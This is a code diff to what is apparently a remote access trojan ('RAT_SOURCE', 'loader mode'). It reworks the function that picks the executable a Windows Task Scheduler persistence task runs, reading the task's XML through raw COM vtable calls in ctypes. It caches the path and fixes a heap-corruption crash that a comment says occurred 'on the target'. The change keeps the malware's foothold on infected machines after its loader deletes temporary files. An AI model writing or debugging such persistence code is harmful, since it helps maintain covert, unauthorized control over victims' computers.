@@ -383,8 +383,11 @@ def _ts_open():
     Returns (service, root_folder) raw COM pointers or None. All calls
     are vtable-indexed; taskschd interfaces are IDispatch-derived, so
     custom methods start at slot 7:
-      ITaskService: GetFolder=7, Connect=10
-      ITaskFolder:  GetTask=13, RegisterTask=16
+      ITaskService:    GetFolder=7, Connect=10
+      ITaskFolder:     GetTask=13, RegisterTask=16
+      IRegisteredTask: get_Xml=20  (slot 19 is get_Definition: returns an
+                       ITaskDefinition*; SysFreeString on that pointer
+                       corrupts the heap -> 0xc0000374)
     """
     import ctypes
     ole32 = ctypes.oledll.ole32
@@ -2252,55 +2255,80 @@ def _loader_exe_path() -> str:
     return ""
 
 
+_PERSIST_EXE_CACHE = [None]   # loader-mode persistence path, resolved
+                              # once per process (see _persistence_exe)
+
+
 def _persistence_exe() -> str:
     """Path the persistence task should run. Under RAT_SOURCE=1 (loader
     mode) GetModuleFileNameW(NULL) resolves to the temporary python.exe in
     the loader's pyXXXXXXXX dir, which the loader deletes - re-registering
     the task to that path would brick persistence. Prefer the LOADER exe
     recorded in the existing task's XML; fall back to the installed loader
-    exe, then the module path."""
+    exe, then the module path.
+
+    Once a trustworthy path is found (task-XML command or installed loader
+    exe) it is cached module-wide, so hot-path callers (suspend/resume
+    WndProc, wake arm/rearm) do not reopen Task Scheduler COM sessions on
+    every invocation. The volatile loader-mode module path is never cached.
+    """
     if os.name != "nt" or os.environ.get("RAT_SOURCE") != "1":
         return _module_exe_path()
-    fallback = lambda: _loader_exe_path() or _module_exe_path()
+    if _PERSIST_EXE_CACHE[0]:
+        return _PERSIST_EXE_CACHE[0]
+    mod = _module_exe_path()
     try:
         import ctypes
         import re
         import xml.sax.saxutils as _sx
         handles = _ts_open()
-        if not handles:
-            return fallback()
-        svc, folder = handles
-        try:
-            get = _com_slot(folder, 13, ctypes.c_wchar_p,   # ITaskFolder::GetTask
-                            ctypes.POINTER(ctypes.c_void_p))
-            task = ctypes.c_void_p()
-            if get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
-                   ctypes.byref(task)) != 0 or not task.value:
-                return fallback()
+        if handles:
+            svc, folder = handles
             try:
-                xml_get = _com_slot(task, 19,        # IRegisteredTask::get_Xml
-                                    ctypes.POINTER(ctypes.c_void_p))
-                bstr = ctypes.c_void_p()
-                if xml_get(task, ctypes.byref(bstr)) != 0 or not bstr.value:
-                    return fallback()
-                try:
-                    xml = ctypes.cast(bstr, ctypes.c_wchar_p).value or ""
-                finally:
-                    ctypes.windll.oleaut32.SysFreeString(bstr)
-                m = re.search(r"<Command>(.*?)</Command>", xml, re.S)
-                if not m:
-                    return fallback()
-                path = _sx.unescape(
-                    m.group(1), {"&quot;": '"', "&apos;": "'"})
-                if path and os.path.exists(path):
-                    return path
+                # ITaskFolder::GetTask = slot 13 (IDispatch base 0-6;
+                # get_Name=7 .. RegisterTask=16)
+                get = _com_slot(folder, 13, ctypes.c_wchar_p,
+                                ctypes.POINTER(ctypes.c_void_p))
+                task = ctypes.c_void_p()
+                if get(folder, ctypes.c_wchar_p(SCHTASK_NAME),
+                       ctypes.byref(task)) == 0 and task.value:
+                    try:
+                        # IRegisteredTask::get_Xml = vtable slot 20.
+                        # (get_Definition=19 returns an ITaskDefinition*;
+                        # SysFreeString on that interface pointer is what
+                        # corrupted the heap - 0xc0000374 - on the target.)
+                        xml_get = _com_slot(task, 20,
+                                            ctypes.POINTER(ctypes.c_void_p))
+                        bstr = ctypes.c_void_p()
+                        # SysFreeString only on real S_OK + non-NULL BSTR,
+                        # never on a failed/vacated out-param.
+                        if xml_get(task,
+                                   ctypes.byref(bstr)) == 0 and bstr.value:
+                            try:
+                                xml = (ctypes.cast(
+                                    bstr, ctypes.c_wchar_p).value or "")
+                            finally:
+                                ctypes.windll.oleaut32.SysFreeString(bstr)
+                            m = re.search(r"<Command>(.*?)</Command>",
+                                          xml, re.S)
+                            if m:
+                                path = _sx.unescape(
+                                    m.group(1),
+                                    {"&quot;": '"', "&apos;": "'"})
+                                if path and os.path.exists(path):
+                                    _PERSIST_EXE_CACHE[0] = path
+                                    return path
+                    finally:
+                        _com_release(task)
             finally:
-                _com_release(task)
-        finally:
-            _ts_release(svc, folder)
+                _ts_release(svc, folder)
     except Exception:
         pass
-    return fallback()
+    path = _loader_exe_path()
+    if path:
+        _PERSIST_EXE_CACHE[0] = path
+        return path
+    return mod     # volatile loader temp exe - deliberately not cached
 
 
 def _elevate_respawn() -> str:
